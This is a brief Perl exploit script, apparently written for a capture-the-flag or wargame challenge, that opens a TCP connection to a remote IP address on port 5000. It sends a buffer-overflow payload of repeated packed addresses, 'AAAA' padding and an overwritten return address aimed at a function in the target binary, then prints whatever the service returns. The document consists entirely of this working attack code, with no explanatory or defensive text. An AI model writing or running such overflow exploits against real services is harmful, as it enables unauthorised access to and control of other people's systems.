#!/usr/bin/perl

use IO::Socket::INET;
use strict;

my $sock = IO::Socket::INET->new(
    #PeerAddr => '127.0.0.1',
    PeerAddr => '212.71.235.214',
				 PeerPort => 5000,
				 Proto => 'tcp') || die $@;


print $sock pack('L', 0x080483a0)x(0x24) . 'AAAA' . pack('L', 0x080485c0) . "\n";

while(my $line = <$sock>) {
    print $line;
}
